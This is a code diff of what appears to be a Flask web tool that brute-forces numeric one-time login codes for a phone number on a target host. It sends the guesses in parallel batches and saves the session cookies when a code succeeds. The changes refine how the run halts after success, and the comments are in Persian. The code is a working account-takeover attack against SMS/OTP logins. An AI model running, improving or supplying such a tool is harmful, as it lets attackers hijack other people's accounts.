@@ -47,7 +47,7 @@ def save_cookies(cookies, code_str):
         return False
 
 def send_request(host, login_otp_nonce, mobile, code_values, counter, max_retries=5):
-    global current_status, last_cookie_file
+    global current_status, last_cookie_file, found_success, running
     headers = {
         "Host": host,
         "Sec-Ch-Ua-Platform": "\"Windows\"",
@@ -97,12 +97,18 @@ def send_request(host, login_otp_nonce, mobile, code_values, counter, max_retrie
                     save_cookies(response.cookies, code_str)
                     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                     output_file = f"success_{code_str}_{timestamp}.txt"
-                    cookie_link = f"http://{request.host}/last_cookie"  # لینک به آخرین کوکی
+                    cookie_link = f"http://{request.host}/last_cookie"
                     with open(output_file, 'w', encoding='utf-8') as f:
                         f.write(msg + f"\nLast cookie file: {cookie_link}\n")
-                    progress_log.append(f"Success found! Output saved in {output_file}. Last cookie: {cookie_link}")
-                    print(f"Success found! Output saved in {output_file}. Last cookie: {cookie_link}")  # لاگ به ترمینال
-                    current_status["error"] = f"Success found! Last cookie: {cookie_link}"
+                    success_msg = (f"Code {code_str} found successfully! Process stopped.\n"
+                                   f"Output saved in {output_file}\n"
+                                   f"Last cookie: {cookie_link}")
+                    progress_log.append(success_msg)
+                    print(success_msg)  # لاگ به ترمینال
+                    current_status["error"] = success_msg
+                    current_status["running"] = False
+                    found_success = True
+                    running = False  # توقف فوری
                     return True
                 else:
                     progress_log.append(f"Failed with code {code_str} (number {counter}): {json_response}")
@@ -151,8 +157,8 @@ def run_bruteforce(host, login_otp_nonce, mobile, connections, start_range, end_
     for batch_start in range(start_range, end_range, batch_size):
         if not running or found_success:
             if found_success:
-                progress_log.append("Stopping: Successful code found!")
-                print("Stopping: Successful code found!")  # لاگ به ترمینال
+                progress_log.append("Process stopped: Successful code found!")
+                print("Process stopped: Successful code found!")  # لاگ به ترمینال
             else:
                 progress_log.append("Process stopped manually!")
                 print("Process stopped manually!")  # لاگ به ترمینال
@@ -173,14 +179,14 @@ def run_bruteforce(host, login_otp_nonce, mobile, connections, start_range, end_
                     if future.result():
                         found_success = True
                         running = False
-                        progress_log.append("Process stopped because a successful code was found!")
-                        print("Process stopped because a successful code was found!")  # لاگ به ترمینال
-                        current_status["running"] = False
-                        break
+                        break  # توقف حلقه داخلی
                 except Exception as e:
                     progress_log.append(f"Exception in future: {str(e)}")
                     print(f"Exception in future: {str(e)}")  # لاگ به ترمینال
                     current_status["error"] = str(e)
+
+        if found_success:
+            break  # توقف حلقه اصلی
 
         current_status["processed"] = batch_end
         if not found_success:
@@ -190,6 +196,9 @@ def run_bruteforce(host, login_otp_nonce, mobile, connections, start_range, end_
         progress_log.append(f"No successful code found in range {start_range:05d}-{end_range:05d}.")
         print(f"No successful code found in range {start_range:05d}-{end_range:05d}.")  # لاگ به ترمینال
         current_status["running"] = False
+    # ریست برای کار بعدی
+    running = False
+    found_success = False
 
 @app.route('/start', methods=['POST'])
 def start():
